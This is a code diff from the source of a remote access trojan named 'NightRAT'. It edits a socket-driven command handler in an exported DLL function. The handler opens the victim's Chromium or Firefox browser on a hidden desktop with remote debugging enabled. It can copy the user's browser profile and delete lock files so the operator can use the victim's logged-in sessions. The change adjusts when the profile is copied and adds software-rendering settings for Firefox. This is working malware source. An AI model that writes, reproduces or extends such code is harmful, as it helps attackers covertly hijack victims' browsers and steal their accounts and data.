@@ -2027,18 +2027,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         return;
                     }
 
-                    wchar_t tempPath[MAX_PATH];
-                    GetTempPathW(MAX_PATH, tempPath);
-                    wstring tempProfileRoot = tempPath;
-                    tempProfileRoot += L"NightRAT_";
-                    if (wRequestedPath == L"Opera GX") {
-                        tempProfileRoot += L"operagx";
-                    } else {
-                        tempProfileRoot += exeName;
-                    }
-                    tempProfileRoot += L"_Profile";
-
-                    wstring profilePath = tempProfileRoot;
+                    wstring profilePath;
                     wstring profileDir = L"Default";
 
                     if (copyProfile) {
@@ -2053,6 +2042,17 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                             send_error("User Data directory not found.");
                             return;
                         }
+
+                        wchar_t tempPath[MAX_PATH];
+                        GetTempPathW(MAX_PATH, tempPath);
+                        wstring tempProfileRoot = tempPath;
+                        tempProfileRoot += L"NightRAT_";
+                        if (wRequestedPath == L"Opera GX") {
+                            tempProfileRoot += L"operagx";
+                        } else {
+                            tempProfileRoot += exeName;
+                        }
+                        tempProfileRoot += L"_Profile";
 
                         // Mevcut kopya varsa temizle
                         try {
@@ -2102,14 +2102,10 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                             }
                             profilePath = tempProfileRoot;
                         }
-                    } else {
-                        try {
-                            fs::create_directories(profilePath);
-                        } catch (...) {}
                     }
 
-                    // Unconditionally delete lock files before launch
-                    if (!profilePath.empty()) {
+                    // Delete lock files if we are using copied profile
+                    if (copyProfile && !profilePath.empty()) {
                         vector<wstring> lockFiles = {
                             L"SingletonLock", L"SingletonSocket", L"SingletonCookie",
                             L"parent.lock", L"lock", L"Parent.lock"
@@ -2134,12 +2130,12 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     wstring args;
                     if (isGecko) {
                         args = L" -no-remote";
-                        if (!profilePath.empty()) {
+                        if (copyProfile && !profilePath.empty()) {
                             args += L" -profile \"" + profilePath + L"\"";
                         }
                     } else {
                         args = L" --remote-debugging-port=9222";
-                        if (!profilePath.empty()) {
+                        if (copyProfile && !profilePath.empty()) {
                             args += L" --user-data-dir=\"" + profilePath + L"\"";
                             args += L" --profile-directory=\"" + profileDir + L"\"";
                         }
@@ -2187,6 +2183,11 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         SetThreadDesktop(g_hHiddenDesktop);
                     }
 
+                    if (isGecko) {
+                        SetEnvironmentVariableW(L"MOZ_FORCE_DISABLE_HARDWARE_ACCELERATION", L"1");
+                        SetEnvironmentVariableW(L"MOZ_WEBRENDER", L"software");
+                    }
+
                     if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
                                        0, NULL, NULL, &si, &pi)) {
                         CloseHandle(pi.hProcess);
@@ -2195,6 +2196,11 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         send_status("Browser started on hidden desktop");
                     } else {
                         send_error("Failed to start browser. Error: " + to_string(GetLastError()));
+                    }
+
+                    if (isGecko) {
+                        SetEnvironmentVariableW(L"MOZ_FORCE_DISABLE_HARDWARE_ACCELERATION", NULL);
+                        SetEnvironmentVariableW(L"MOZ_WEBRENDER", NULL);
                     }
 
                     if (hCurrentDesktop) {
